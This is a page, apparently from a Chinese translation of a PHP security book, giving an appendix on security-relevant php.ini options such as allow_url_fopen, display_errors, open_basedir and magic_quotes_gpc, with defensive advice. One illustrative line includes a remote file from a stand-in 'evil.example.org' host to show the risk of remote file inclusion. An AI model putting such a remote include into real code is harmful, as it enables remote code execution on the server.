<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


   <title>&#38468;&#24405; A. &#37197;&#32622;&#36873;&#39033;</title>
   <meta name="generator" content="Help &amp; Manual" />
   <meta name="keywords" content="" />
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <link type="text/css" href="default.css" rel="stylesheet" />
</head>
<body style="margin: 0px 0px 0px 0px; background: #FFFFFF;">


<table width="100%" border="0" cellspacing="0" cellpadding="5" bgcolor="#649CCC">
  <tr valign="middle">
    <td align="left">
      <p class="p_Heading1"><span class="f_Heading1">&#38468;&#24405; A. &#37197;&#32622;&#36873;&#39033;</span></p>

    </td>
    <td align="right">
     <span style="font-size: 9pt">
     <a href="introduction.htm">Top</a>&nbsp;
     <a href="new_item52.htm">Previous</a>&nbsp;
     <a href="new_item54.htm">Next</a>
     </span>
    </td>
  </tr>
</table>


<!-- Placeholder for topic body. -->
<table width="100%" border="0" cellspacing="0" cellpadding="5"><tr valign="top"><td align="left">
<p style="line-height: 2.0;">&#38468;&#24405; A. &#37197;&#32622;&#36873;&#39033;</p>
<p style="line-height: 2.0;">  &nbsp; &#23613;&#31649;&#26412;&#20070;&#30340;&#28966;&#28857;&#26159;&#22312;&#20110;&#24212;&#29992;&#30340;&#23433;&#20840;&#24615;&#65292;&#20294;&#26377;&#19968;&#20123;&#37197;&#32622;&#36873;&#39033;&#26159;&#20219;&#20309;&#20851;&#24515;&#23433;&#20840;&#30340;&#24320;&#21457;&#32773;&#24517;&#38656;&#29087;&#24713;&#30340;&#12290;PHP&#30340;&#37197;&#32622;&#20250;&#24433;&#21709;&#20320;&#25152;&#20889;&#20195;&#30721;&#30340;&#34892;&#20026;&#20197;&#21450;&#20320;&#20351;&#29992;&#30340;&#25216;&#24039;&#65292;&#24517;&#35201;&#26102;&#20320;&#38656;&#35201;&#31245;&#31245;&#36127;&#36131;&#19968;&#19979;&#24212;&#29992;&#31243;&#24207;&#20197;&#22806;&#30340;&#19996;&#35199;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; PHP&#30340;&#37197;&#32622;&#20027;&#35201;&#30001;&#19968;&#20010;&#21517;&#20026;php.ini&#30340;&#25991;&#20214;&#25152;&#25351;&#23450;&#12290;&#35813;&#25991;&#20214;&#21253;&#21547;&#24456;&#22810;&#37197;&#32622;&#36873;&#39033;&#65292;&#27599;&#19968;&#39033;&#37117;&#20250;&#23545;PHP&#20135;&#29983;&#38750;&#24120;&#29305;&#23450;&#30340;&#24433;&#21709;&#12290;&#22914;&#26524;&#35813;&#25991;&#20214;&#19981;&#23384;&#22312;&#65292;&#25110;&#32773;&#35813;&#25991;&#20214;&#20013;&#30340;&#26576;&#36873;&#39033;&#19981;&#23384;&#22312;&#65292;&#21017;&#20250;&#20351;&#29992;&#40664;&#35748;&#20540;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#22914;&#26524;&#20320;&#19981;&#30693;&#36947;php.ini&#25991;&#20214;&#25152;&#22312;&#30340;&#20301;&#32622;&#65292;&#20320;&#21487;&#20197;&#20351;&#29992;phpinfo( )&#26469;&#30830;&#23450;PHP&#20013;&#23545;&#35813;&#25991;&#20214;&#36335;&#24452;&#30340;&#23450;&#20041;&#65306;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; &lt;?php</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; phpinfo();</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; ?&gt;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; &#22270;A-1 &#25152;&#31034;&#30340;&#31532;&#20845;&#34892;&#65288;&#37197;&#32622;&#25991;&#20214;(php.ini)&#36335;&#24452;&#65289;&#26174;&#31034;&#20102;php.ini&#30340;&#23436;&#25972;&#36335;&#24452;&#12290;&#22914;&#26524;&#21482;&#26174;&#31034;&#20102;&#36335;&#24452;&#65288;&#27809;&#26377;&#25991;&#20214;&#21517;&#65289;&#65292;&#36825;&#23601;&#24847;&#21619;&#30528;PHP&#26080;&#27861;&#22312;&#25152;&#31034;&#36335;&#24452;&#25214;&#21040;php.ini&#25991;&#20214;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#35813;&#25991;&#20214;&#21253;&#21547;&#30340;&#33258;&#36523;&#35828;&#26126;&#38750;&#24120;&#22909;&#65292;&#22240;&#27492;&#20320;&#21487;&#20197;&#38405;&#35835;&#35813;&#25991;&#20214;&#24182;&#36873;&#25321;&#36866;&#21512;&#20320;&#30340;&#37197;&#32622;&#36873;&#39033;&#12290;&#32780;&#25163;&#20876;&#26356;&#26159;&#35814;&#32454;&#65292;&#25152;&#20197;&#22312;&#20320;&#38656;&#35201;&#26576;&#19968;&#36873;&#39033;&#30340;&#26356;&#22810;&#20449;&#24687;&#26102;&#65292;&#25105;&#25512;&#33616;&#35775;&#38382;http://php.net/manual/ini.php</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">&#22270;A-1. phpinfo( ) &#20989;&#25968;&#21487;&#29992;&#20110;php.ini&#25991;&#20214;&#30340;&#23450;&#20301;</p>
<p style="text-align: justify; line-height: 2.0;"><img src="embim5.png" width="550" height="412" vspace="1" hspace="1" border="0" alt=""></p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.1. allow_url_fopen</p>
<p style="line-height: 2.0;">  &nbsp; &#27491;&#22914;&#31532;&#20845;&#31456;&#25152;&#31034;&#65292;allow_url_fopen&#36873;&#39033;&#20801;&#35768;&#20320;&#22914;&#21516;&#26412;&#22320;&#25991;&#20214;&#19968;&#26679;&#24341;&#29992;&#36828;&#31243;&#36164;&#28304;&#65306;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">&lt;?php</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; $contents = file_get_contents('http://example.org/xss.html');</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; ?&gt;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; &#22312;&#31532;&#20116;&#31456;&#20013;&#25581;&#31034;&#20102;&#24403;&#23427;&#19982;include&#25110;require&#30456;&#32467;&#21512;&#26102;&#30340;&#21361;&#38505;&#24615;&#65306;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; &lt;?php</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; include 'http://evil.example.org/evil.inc';</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; ?&gt;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">  &nbsp; &#25105;&#25512;&#33616;&#20851;&#38381;allow_url_fopen&#36873;&#39033;&#65292;&#38500;&#38750;&#20320;&#30340;&#24212;&#29992;&#38656;&#35201;&#23427;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.2. disable_functions</p>
<p style="line-height: 2.0;">  &nbsp; disable_functions&#36873;&#39033;&#26159;&#38750;&#24120;&#26377;&#29992;&#30340;&#65292;&#23427;&#21487;&#20197;&#30830;&#20445;&#19968;&#20123;&#26377;&#28508;&#22312;&#23041;&#32961;&#30340;&#20989;&#25968;&#19981;&#33021;&#34987;&#20351;&#29992;&#12290;&#23613;&#31649;&#21487;&#20197;&#24314;&#31435;&#35268;&#33539;&#21435;&#31105;&#27490;&#20351;&#29992;&#36825;&#20123;&#20989;&#25968;&#65292;&#20294;&#22312;PHP&#37197;&#32622;&#20013;&#36827;&#34892;&#38480;&#21046;&#35201;&#27604;&#20381;&#36182;&#20110;&#24320;&#21457;&#32773;&#23545;&#35268;&#33539;&#30340;&#36981;&#24490;&#35201;&#21487;&#38752;&#24471;&#22810;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#25105;&#24314;&#31435;&#23545;&#38468;&#24405;B&#21015;&#20986;&#30340;&#20989;&#25968;&#36827;&#34892;&#26816;&#26597;&#65292;&#30475;&#19968;&#19979;&#26159;&#21542;&#35201;&#23545;&#19968;&#20123;&#20989;&#25968;&#36827;&#34892;&#38480;&#21046;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.3. display_errors</p>
<p style="line-height: 2.0;">  &nbsp; PHP&#30340;&#38169;&#35823;&#25253;&#21578;&#21487;&#20197;&#24110;&#21161;&#20320;&#21457;&#29616;&#20320;&#25152;&#20889;&#20195;&#30721;&#20013;&#30340;&#38169;&#35823;&#12290;&#24403;&#20320;&#24320;&#21457;&#24212;&#29992;&#26102;&#65292;&#25226;&#38169;&#35823;&#25552;&#31034;&#26174;&#31034;&#20986;&#26469;&#26159;&#21462;&#24471;&#21363;&#26102;&#21453;&#39304;&#30340;&#26377;&#25928;&#26041;&#27861;&#65292;&#21516;&#26102;&#20063;&#21487;&#20197;&#21152;&#24555;&#24320;&#21457;&#36895;&#24230;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#22312;&#19968;&#20010;&#20135;&#21697;&#32423;&#30340;&#24212;&#29992;&#20013;&#65292;&#36825;&#19968;&#34892;&#20026;&#20250;&#25104;&#20026;&#19968;&#39033;&#23433;&#20840;&#39118;&#38505;&#12290;&#22914;&#26524;&#23427;&#26174;&#31034;&#38169;&#35823;&#20449;&#24687;&#65292;&#25152;&#26377;&#20154;&#23601;&#21487;&#20197;&#24471;&#30693;&#20320;&#30340;&#24212;&#29992;&#20013;&#30340;&#37325;&#35201;&#20449;&#24687;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#22312;&#20135;&#21697;&#20013;&#20320;&#38656;&#35201;&#20851;&#38381;display_errors&#36873;&#39033;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.4. enable_dl</p>
<p style="line-height: 2.0;">  &nbsp; enable_dl&#36873;&#39033;&#29992;&#20110;&#25511;&#21046;dl()&#20989;&#25968;&#26159;&#21542;&#29983;&#25928;&#65292;&#35813;&#20989;&#25968;&#20801;&#35768;&#22312;&#36816;&#34892;&#26102;&#21152;&#36733;PHP&#25193;&#23637;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#20351;&#29992;dl()&#20989;&#25968;&#21487;&#33021;&#23548;&#33268;&#25915;&#20987;&#32773;&#32469;&#36807;open_basedir&#38480;&#21046;&#65292;&#22240;&#27492;&#38500;&#38750;&#26377;&#24517;&#35201;&#65292;&#20320;&#24517;&#39035;&#22312;&#20320;&#30340;&#24212;&#29992;&#20013;&#31105;&#27490;&#23427;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.5. error_reporting</p>
<p style="line-height: 2.0;">  &nbsp; &#24456;&#22810;&#23433;&#20840;&#28431;&#27934;&#26159;&#30001;&#20110;&#20351;&#29992;&#20102;&#26410;&#21021;&#22987;&#21270;&#30340;&#21464;&#37327;&#25110;&#20854;&#23427;&#38543;&#24847;&#30340;&#32534;&#31243;&#26041;&#27861;&#24341;&#36215;&#30340;&#12290;&#36890;&#36807;&#25226;PHP&#30340;error_reporting&#36873;&#39033;&#32622;&#20026;E_ALL &#25110; E_ALL | E_STRICT&#65292;PHP&#23601;&#20250;&#23545;&#19978;&#36848;&#34892;&#20026;&#36827;&#34892;&#25552;&#31034;&#12290;&#36825;&#20123;&#35774;&#32622;&#37117;&#20026;&#25253;&#21578;Notice&#32423;&#21035;&#30340;&#38169;&#35823;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#25105;&#24314;&#35758;&#25226;error_reporting&#33267;&#23569;&#35774;&#23450;&#20026;E_ALL&#12290;&#65288;&#35793;&#27880;&#65306;&#22312;&#24320;&#21457;&#20013;&#65289;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.6. file_uploads</p>
<p style="line-height: 2.0;">  &nbsp; file_uploads&#36873;&#39033;&#20915;&#23450;&#20102;&#26159;&#21542;&#20801;&#35768;&#19978;&#20256;&#25991;&#20214;&#12290;&#22240;&#27492;&#65292;&#22914;&#26524;&#20320;&#30340;&#24212;&#29992;&#19981;&#38656;&#35201;&#29992;&#25143;&#19978;&#20256;&#25991;&#20214;&#65292;&#37027;&#20040;&#20851;&#38381;&#35813;&#36873;&#39033;&#23601;&#26159;&#26368;&#22909;&#30340;&#36873;&#25321;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#21482;&#26159;&#31616;&#21333;&#22320;&#22312;PHP&#20195;&#30721;&#20013;&#19981;&#23545;&#19978;&#20256;&#25991;&#20214;&#36827;&#34892;&#22788;&#29702;&#26159;&#19981;&#22815;&#30340;&#65292;&#22240;&#20026;&#22312;&#25191;&#34892;&#20320;&#30340;&#20195;&#30721;&#21069;&#65292;PHP&#23601;&#20570;&#20102;&#19968;&#20123;&#24037;&#20316;&#65288;&#22914;&#26681;&#25454;&#30456;&#20851;&#37096;&#25454;&#29983;&#25104;$_FILES&#25968;&#32452;&#65289;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.7. log_errors</p>
<p style="line-height: 2.0;">  &nbsp; &#24403;log_errors&#35774;&#20026;&#26377;&#25928;&#26102;&#65292;PHP&#20250;&#21521;error_log&#37197;&#32622;&#36873;&#39033;&#25351;&#23450;&#30340;&#25991;&#20214;&#20013;&#20889;&#20837;&#25152;&#26377;&#20986;&#38169;&#20449;&#24687;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#24403;display_errors&#35774;&#20026;&#26080;&#25928;&#26102;&#65292;&#23558;log_errors&#35774;&#20026;&#26377;&#25928;&#26159;&#24456;&#37325;&#35201;&#30340;&#65307;&#21542;&#21017;&#20320;&#23558;&#26080;&#27861;&#30475;&#21040;&#30555;&#20986;&#38169;&#20449;&#24687;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#25105;&#24314;&#35758;&#23558;log_errors&#35774;&#20026;&#26377;&#25928;&#24182;&#22312;error_log&#35774;&#23450;&#26085;&#24535;&#25991;&#20214;&#25152;&#22312;&#20301;&#32622;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.8. magic_quotes_gpc</p>
<p style="line-height: 2.0;">  &nbsp; magic_quotes_gpc&#26159;&#19968;&#20010;&#24120;&#29992;&#30340;&#36873;&#39033;&#65292;&#23427;&#30446;&#30340;&#26159;&#38450;&#27490;SQL&#27880;&#20837;&#12290;&#20294;&#20986;&#20110;&#24456;&#22810;&#21407;&#22240;&#65292;&#21253;&#25324;&#23427;&#36716;&#20041;&#36755;&#20837;&#30340;&#26041;&#24335;&#65292;&#35777;&#26126;&#20102;&#23427;&#26159;&#19981;&#23436;&#21892;&#30340;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#23427;&#23545;$_GET, $_POST, &#20197;&#21450; $_COOKIE&#20013;&#30340;&#25968;&#25454;&#20351;&#29992;&#21516;&#26679;&#30340;&#35268;&#21017;&#21363;addslashes( )&#20989;&#25968;&#36827;&#34892;&#22788;&#29702;&#12290;&#20174;&#32780;&#65292;&#23427;&#24182;&#27809;&#26377;&#26681;&#25454;&#20320;&#30340;&#25968;&#25454;&#24211;&#36873;&#29992;&#23545;&#24212;&#30340;&#36716;&#20041;&#20989;&#25968;&#36827;&#34892;&#22788;&#29702;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#22522;&#20110;&#20004;&#20010;&#20027;&#35201;&#30340;&#21407;&#22240;&#65292;&#20320;&#38656;&#35201;&#25226;get_magic_quotes_gpc&#35774;&#20026;&#26080;&#25928;&#65306;</p>
<p style="line-height: 2.0;">  &nbsp; &#39318;&#20808;&#65292;&#23427;&#20250;&#21152;&#22823;&#20320;&#30340;&#36755;&#20837;&#36807;&#28388;&#36923;&#36753;&#30340;&#22797;&#26434;&#24615;&#65292;&#36825;&#26159;&#30001;&#20110;&#23427;&#22312;&#25191;&#34892;&#20320;&#30340;&#20195;&#30721;&#21069;&#39318;&#20808;&#23545;&#25968;&#25454;&#36827;&#34892;&#20102;&#32534;&#36753;&#12290;&#20363;&#22914;&#65292;&#20320;&#38656;&#35201;&#23545;&#36755;&#20837;&#30340;&#22995;&#21517;&#36827;&#34892;&#36807;&#28388;&#65292;&#20854;&#36923;&#36753;&#26159;&#21482;&#20801;&#35768;&#23383;&#27597;&#12289;&#31354;&#26684;&#12289;&#36830;&#35789;&#31526;&#20197;&#21450;&#21333;&#24341;&#21495;&#65292;&#24403;magic_quotes_gpc&#29983;&#25928;&#26102;&#65292;&#20320;&#24517;&#39035;&#36866;&#24212;&#24418;&#22914;O\'Reilly&#30340;&#22995;&#21517;&#25110;&#32773;&#20351;&#29992;stripslashes( )&#23581;&#35797;&#23558;&#23427;&#24674;&#22797;&#21407;&#24418;&#12290;&#36825;&#19968;&#19981;&#24517;&#35201;&#30340;&#22797;&#26434;&#24615;&#65288;&#25110;&#32773;&#35828;&#19981;&#20005;&#35880;&#30340;&#36807;&#28388;&#35268;&#21017;&#65289;&#21152;&#22823;&#20102;&#21457;&#29983;&#38169;&#35823;&#30340;&#21487;&#33021;&#24615;&#65292;&#21516;&#26102;&#65292;&#20320;&#30340;&#36755;&#20837;&#36807;&#28388;&#26426;&#21046;&#20013;&#30340;&#32570;&#38519;&#24517;&#28982;&#20250;&#23548;&#33268;&#23433;&#20840;&#28431;&#27934;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#20854;&#27425;&#65292;&#23427;&#24182;&#27809;&#26377;&#26681;&#25454;&#20320;&#30340;&#25968;&#25454;&#24211;&#36873;&#29992;&#23545;&#24212;&#30340;&#36716;&#20041;&#20989;&#25968;&#36827;&#34892;&#22788;&#29702;&#12290;&#36825;&#26679;&#65292;&#30001;&#20110;&#23427;&#21487;&#20197;&#25269;&#25377;&#19968;&#20123;&#20302;&#23618;&#27425;&#25110;&#20598;&#21457;&#30340;&#25915;&#20987;&#65292;&#25513;&#30422;&#20102;&#23427;&#26159;&#19968;&#20010;&#31967;&#31957;&#30340;&#36807;&#28388;&#25110;&#36716;&#20041;&#26426;&#21046;&#36825;&#20010;&#20107;&#23454;&#65292;&#20174;&#32780;&#30041;&#19979;&#20102;&#19968;&#20010;&#23433;&#20840;&#28431;&#27934;&#65292;&#20351;&#20320;&#30340;&#24212;&#29992;&#26080;&#27861;&#25269;&#25377;&#22914;&#38024;&#23545;&#23383;&#31526;&#38598;&#30340;&#25915;&#20987;&#31561;&#26356;&#22797;&#26434;&#30340;&#25915;&#20987;&#25163;&#27573;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.9. memory_limit</p>
<p style="line-height: 2.0;">  &nbsp; &#20026;&#38450;&#27490;&#20889;&#24471;&#31967;&#31957;&#30340;&#33050;&#26412;&#21344;&#29992;&#25152;&#26377;&#30340;&#21487;&#29992;&#20869;&#23384;&#65292;&#21487;&#20197;&#20351;&#29992;memory_limit&#36873;&#39033;&#23545;&#26368;&#22823;&#20869;&#23384;&#20351;&#29992;&#37327;&#36827;&#34892;&#38480;&#21046;&#65288;&#20197;&#23383;&#33410;&#26041;&#24335;&#25110;&#32553;&#20889;&#26041;&#24335;&#22914;8M&#25351;&#23450;&#65289;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#23613;&#31649;&#26368;&#20339;&#30340;&#21462;&#20540;&#26159;&#19982;&#36816;&#34892;&#30340;&#24212;&#29992;&#26159;&#30456;&#20851;&#30340;&#65292;&#25105;&#36824;&#26159;&#24314;&#35758;&#22312;&#22823;&#22810;&#24773;&#20917;&#19979;&#20351;&#29992;&#40664;&#35748;&#20540;8M&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; memory_limit&#36873;&#39033;&#21482;&#26377;&#22312;PHP&#25351;&#23450;&#20102;enable-memory-limit&#26041;&#24335;&#32534;&#35793;&#26102;&#25165;&#20250;&#29983;&#25928;&#12290;</p>
<p style="line-height: 2.0;">A.10. open_basedir</p>
<p style="line-height: 2.0;">open_basedir&#36873;&#39033;&#20250;&#38480;&#21046;PHP&#21482;&#33021;&#22312;&#23427;&#25351;&#23450;&#30340;&#30446;&#24405;&#20013;&#25171;&#24320;&#25991;&#20214;&#12290;&#23613;&#31649;&#23427;&#19981;&#33021;&#21462;&#20195;&#27491;&#30830;&#30340;&#36755;&#20837;&#36807;&#28388;&#65292;&#20294;&#35813;&#36873;&#39033;&#33021;&#20943;&#23569;&#21033;&#29992;&#25991;&#20214;&#31995;&#32479;&#30456;&#20851;&#20989;&#25968;&#22914;include&#21450;require&#36827;&#34892;&#30340;&#25915;&#20987;&#12290;</p>
<p style="line-height: 2.0;">  &nbsp; &#35813;&#36873;&#39033;&#30340;&#20540;&#20250;&#34987;&#24403;&#20570;&#21069;&#32512;&#20351;&#29992;&#65292;&#22240;&#27492;&#24403;&#20320;&#24819;&#34920;&#31034;&#25351;&#23450;&#30446;&#24405;&#26102;&#35831;&#23567;&#24515;&#19981;&#35201;&#28431;&#20102;&#26368;&#21518;&#30340;&#26012;&#26464;&#65306;</p>
<p style="line-height: 2.0;">  &nbsp; open_basedir = /path/to/</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;"><span style="font-weight: bold;">&#23567;&#25552;&#31034;</span></p>
<p style="line-height: 2.0;">&#35831;&#30830;&#35748;enable_dl&#36873;&#39033;&#26159;&#20851;&#38381;&#30340;&#65292;&#21542;&#21017;open_basedir&#30340;&#38480;&#21046;&#21487;&#33021;&#20250;&#34987;&#32469;&#36807;&#12290;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">A.11. register_globals</p>
<p style="line-height: 2.0;">&#35265;&#31532;&#20108;&#31456;</p>
<p style="line-height: 2.0;">A.12. safe_mode</p>
<p style="line-height: 2.0;">&#35265;&#31532;&#20843;&#31456;</p>
<p style="text-align: justify; line-height: 2.0;"><img src="embim6.png" width="550" height="412" vspace="1" hspace="1" border="0" alt=""></p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<p style="line-height: 2.0;">&nbsp;</p>
<hr noshade size=1 ><p style="line-height: 2.0;">&nbsp;</p>

</td></tr></table>

</body>
</html>
